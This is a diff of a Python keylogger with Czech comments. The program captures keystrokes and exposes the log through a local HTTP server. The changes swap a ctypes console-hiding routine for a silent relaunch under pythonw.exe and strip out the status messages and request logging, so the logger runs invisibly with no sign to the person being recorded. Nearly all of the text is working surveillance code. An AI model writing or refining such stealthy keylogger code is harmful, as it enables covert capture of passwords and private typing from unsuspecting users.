@@ -4,8 +4,17 @@ import socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import time
 import os
-import ctypes
 import sys
+import subprocess
+
+# ✅ ŘEŠENÍ: Restartování pomocí pythonw.exe pro skrytí konzole
+if sys.executable.endswith("python.exe"):
+    # Najdeme cestu k pythonw.exe
+    pythonw_exe = sys.executable.replace("python.exe", "pythonw.exe")
+    
+    # Restartujeme skript pomocí pythonw.exe
+    subprocess.Popen([pythonw_exe] + sys.argv)
+    sys.exit(0)  # Ukončíme původní proces s konzolí
 
 class KeyloggerWithServer:
     def __init__(self, time_interval=30, exit_phrase="terminate", port=8888):
@@ -28,29 +37,10 @@ class KeyloggerWithServer:
         except:
             return "127.0.0.1"
     
-    def hide_console(self):
-        """Kompletně skryje konzolové okno z hlavní liště"""
-        try:
-            # Získání handle konzolového okna
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-            if hwnd:
-                # Kompletně skryje okno z hlavní liště
-                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
-                
-                # Odstraní z hlavní liště (taskbar)
-                GWL_EXSTYLE = -20
-                WS_EX_TOOLWINDOW = 0x00000080
-                current_style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
-                ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, current_style | WS_EX_TOOLWINDOW)
-                
-        except Exception as e:
-            pass  # Pokud selže, program pokračuje normálně
-    
     def append_to_log(self, string):
         self.log += string
         # Kontrola exit fráze
         if self.exit_phrase in self.log.lower():
-            print(f"Exit fráze '{self.exit_phrase}' detekována. Ukončuji program...")
             self.stop()
     
     def process_key_press(self, key):
@@ -126,7 +116,6 @@ class KeyloggerWithServer:
             self.wfile.write(html.encode('utf-8'))
         
         def log_message(self, format, *args):
-            # Potlačí logování HTTP požadavků
             return
     
     def start_server(self):
@@ -138,18 +127,12 @@ class KeyloggerWithServer:
         
         self.RequestHandler.keylogger = self
         
-        # Použijeme pouze lokální přístup pro větší bezpečnost
         server = CustomHTTPServer(('127.0.0.1', self.port), self.RequestHandler)
-        print(f"🚀 Server běží na: http://{self.get_local_ip()}:{self.port}")
-        print("⏳ Okno se zavře za 5 sekund a program poběží na pozadí...")
-        print(f"📝 Pro ukončení napište: '{self.exit_phrase}'")
         server.serve_forever()
     
     def stop(self):
         """Elegantně ukončí program"""
         self.is_running = False
-        print("Program se ukončuje...")
-        # Počkáme chvíli než se ukončí vlákna
         time.sleep(1)
         os._exit(0)
     
@@ -164,12 +147,6 @@ class KeyloggerWithServer:
         keyboard_listener.daemon = True
         keyboard_listener.start()
         self.report()
-        
-        # Počká 5 sekund než skryje okno
-        time.sleep(5)
-        
-        # Kompletně skryje konzolové okno
-        self.hide_console()
         
         # Drží program běžící na pozadí
         while self.is_running:
